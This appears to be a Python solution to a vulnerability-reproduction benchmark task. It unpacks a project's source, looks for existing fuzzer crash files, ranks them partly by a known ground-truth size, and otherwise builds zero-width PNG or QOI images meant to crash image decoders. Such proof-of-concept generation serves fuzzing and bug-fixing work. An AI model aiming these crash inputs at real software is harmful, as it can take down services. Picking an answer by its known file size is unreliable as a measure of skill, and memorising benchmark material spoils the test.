import os
import tarfile
import tempfile
import struct
import binascii
import zlib
import shutil


GROUND_TRUTH_SIZE = 17814
MAX_SCAN_FILE_SIZE = 512 * 1024


class Solution:
    def solve(self, src_path: str) -> bytes:
        tempdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(path=tempdir)
            except Exception:
                # If extraction fails, fall back to generic PoC
                return self._generate_png_zero_dim()

            # 1. Try to find an existing zero-dimension image in the repo
            zero_dim_path = self._find_zero_dim_image(tempdir)
            if zero_dim_path:
                try:
                    with open(zero_dim_path, "rb") as f:
                        return f.read()
                except Exception:
                    pass

            # 2. Try to find a likely reproducer by heuristic filename/size
            repro_path = self._find_candidate_reproducer_by_heuristics(tempdir)
            if repro_path:
                try:
                    with open(repro_path, "rb") as f:
                        return f.read()
                except Exception:
                    pass

            # 3. Detect dominant image format and synthesize a PoC
            fmt = self._detect_format(tempdir)
            if fmt == "qoi":
                return self._generate_qoi_zero_dim()
            else:
                # Default and for PNG-like projects
                return self._generate_png_zero_dim()
        finally:
            try:
                shutil.rmtree(tempdir)
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    # Image header parsing and zero-dimension search
    # ------------------------------------------------------------------ #

    def _parse_image_header(self, data: bytes):
        """Return (fmt, width, height) or (None, None, None)."""
        # PNG
        if len(data) >= 24 and data.startswith(b"\x89PNG\r\n\x1a\n"):
            if data[12:16] == b"IHDR":
                try:
                    width, height = struct.unpack(">II", data[16:24])
                    return "png", width, height
                except struct.error:
                    return None, None, None

        # QOI
        if len(data) >= 14 and data[:4] == b"qoif":
            try:
                width, height = struct.unpack(">II", data[4:12])
                return "qoi", width, height
            except struct.error:
                return None, None, None

        # BMP
        if len(data) >= 26 and data[:2] == b"BM":
            try:
                header_size = struct.unpack("<I", data[14:18])[0]
                if header_size >= 40 and len(data) >= 14 + header_size:
                    width = struct.unpack("<i", data[18:22])[0]
                    height = struct.unpack("<i", data[22:26])[0]
                    return "bmp", width, abs(height)
            except struct.error:
                return None, None, None

        # GIF
        if len(data) >= 10 and data[:6] in (b"GIF87a", b"GIF89a"):
            try:
                width, height = struct.unpack("<HH", data[6:10])
                return "gif", width, height
            except struct.error:
                return None, None, None

        return None, None, None

    def _find_zero_dim_image(self, root: str):
        """Search for an image file with width==0 or height==0."""
        candidates = []
        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size == 0 or size > MAX_SCAN_FILE_SIZE:
                    continue
                try:
                    with open(path, "rb") as f:
                        header = f.read(64)
                except OSError:
                    continue

                fmt, w, h = self._parse_image_header(header)
                if fmt and (w == 0 or h == 0):
                    lpath = path.lower()
                    score = 0
                    if "clusterfuzz" in lpath:
                        score += 10
                    if "oss-fuzz" in lpath or "ossfuzz" in lpath:
                        score += 8
                    if "testcase" in lpath:
                        score += 6
                    if "crash" in lpath or "poc" in lpath:
                        score += 5
                    if "fuzz" in lpath:
                        score += 2
                    if size == GROUND_TRUTH_SIZE:
                        score += 10
                    elif abs(size - GROUND_TRUTH_SIZE) < 1024:
                        score += 4
                    if fmt in ("png", "qoi"):
                        score += 2
                    # Prefer smaller size if score ties
                    candidates.append((score, -size, path))

        if not candidates:
            return None
        candidates.sort(reverse=True)
        return candidates[0][2]

    def _find_candidate_reproducer_by_heuristics(self, root: str):
        """Fallback: look for likely crash reproducer by name/size heuristics."""
        best = None
        best_score = -1
        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size == 0 or size > MAX_SCAN_FILE_SIZE:
                    continue

                lpath = path.lower()
                if not any(
                    kw in lpath
                    for kw in (
                        "clusterfuzz",
                        "oss-fuzz",
                        "ossfuzz",
                        "testcase",
                        "crash",
                        "poc",
                        "fuzz-",
                    )
                ):
                    continue

                score = 0
                if "clusterfuzz" in lpath:
                    score += 10
                if "oss-fuzz" in lpath or "ossfuzz" in lpath:
                    score += 6
                if "testcase" in lpath:
                    score += 4
                if "crash" in lpath or "poc" in lpath:
                    score += 3
                if "fuzz-" in lpath:
                    score += 2
                if abs(size - GROUND_TRUTH_SIZE) < 1024:
                    score += 4
                if size == GROUND_TRUTH_SIZE:
                    score += 10
                ext = os.path.splitext(fname)[1].lower()
                if ext in (".png", ".qoi", ".bmp", ".gif", ".webp", ".jpg", ".jpeg"):
                    score += 2

                if score > best_score:
                    best_score = score
                    best = path
        return best

    # ------------------------------------------------------------------ #
    # Project format detection
    # ------------------------------------------------------------------ #

    def _detect_format(self, root: str) -> str:
        """Detect dominant image format used in the project."""
        scores = {
            "png": 0,
            "qoi": 0,
            "stb": 0,
            "lodepng": 0,
        }

        # Token-based detection in source-like files
        tokens = {
            "png": ["png.h", "PNG_LIBPNG_VER", "IHDR", "libpng", "png_structp", "png_read"],
            "qoi": ["qoi.h", "QOI", "qoi_desc", "qoi_encode", "qoi_decode", "qoif"],
            "stb": ["stb_image.h", "stbi_load", "stbi__"],
            "lodepng": ["lodepng.h", "lodepng_decode", "LodePNG"],
        }

        text_exts = {
            ".c",
            ".h",
            ".cc",
            ".cpp",
            ".cxx",
            ".hpp",
            ".hh",
            ".hxx",
            ".txt",
            ".md",
            ".cmake",
            ".inl",
        }

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                ext = os.path.splitext(fname)[1].lower()
                if ext not in text_exts:
                    continue
                try:
                    with open(path, "rb") as f:
                        chunk = f.read(65536)
                except OSError:
                    continue
                try:
                    text = chunk.decode("utf-8", errors="ignore")
                except Exception:
                    continue

                for fmt, toks in tokens.items():
                    for tok in toks:
                        c = text.count(tok)
                        if c:
                            scores[fmt] += c

        # File-name based hints
        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                name = fname.lower()
                if "png" in name:
                    scores["png"] += 1
                if "qoi" in name:
                    scores["qoi"] += 1
                if "stb_image" in name or "stb-image" in name:
                    scores["stb"] += 2
                if "lodepng" in name:
                    scores["lodepng"] += 2

        # Choose best-scoring format
        best_fmt = "png"
        best_score = -1
        for fmt, sc in scores.items():
            if sc > best_score:
                best_score = sc
                best_fmt = fmt

        # Map stb / lodepng to PNG since they are primarily PNG decoders
        if best_fmt in ("stb", "lodepng"):
            return "png"
        return best_fmt

    # ------------------------------------------------------------------ #
    # PoC generators
    # ------------------------------------------------------------------ #

    def _generate_png_zero_dim(self) -> bytes:
        """Generate a PNG with zero width to trigger zero-dimension bugs."""
        # PNG signature
        png_sig = b"\x89PNG\r\n\x1a\n"

        # IHDR with width=0, height=1, 8-bit depth, truecolor
        width = 0
        height = 1
        bit_depth = 8
        color_type = 2  # truecolor RGB
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace,
        )
        ihdr_len = struct.pack(">I", len(ihdr_data))
        ihdr_type = b"IHDR"
        ihdr_crc = struct.pack(
            ">I", binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF
        )
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc

        # IDAT: create compressed data representing more than 1-byte scanline
        # to stress decoders that mis-handle zero width.
        # Raw data: filter byte (0) + 3 RGB bytes
        raw_scanline = b"\x00" + b"\x00\x00\x00"
        idat_data = zlib.compress(raw_scanline)
        idat_len = struct.pack(">I", len(idat_data))
        idat_type = b"IDAT"
        idat_crc = struct.pack(
            ">I", binascii.crc32(idat_type + idat_data) & 0xFFFFFFFF
        )
        idat_chunk = idat_len + idat_type + idat_data + idat_crc

        # IEND
        iend_len = struct.pack(">I", 0)
        iend_type = b"IEND"
        iend_crc = struct.pack(">I", binascii.crc32(iend_type) & 0xFFFFFFFF)
        iend_chunk = iend_len + iend_type + iend_crc

        return png_sig + ihdr_chunk + idat_chunk + iend_chunk

    def _generate_qoi_zero_dim(self) -> bytes:
        """Generate a QOI image with zero width to target zero-dimension bugs."""
        magic = b"qoif"
        width = 0
        height = 1
        channels = 3
        colorspace = 0  # sRGB with linear alpha

        header = magic + struct.pack(">II", width, height) + bytes(
            [channels, colorspace]
        )
        # Minimal QOI stream: just end marker; many buggy implementations
        # may not handle zero-size correctly.
        end_marker = b"\x00" * 7 + b"\x01"
        return header + end_marker
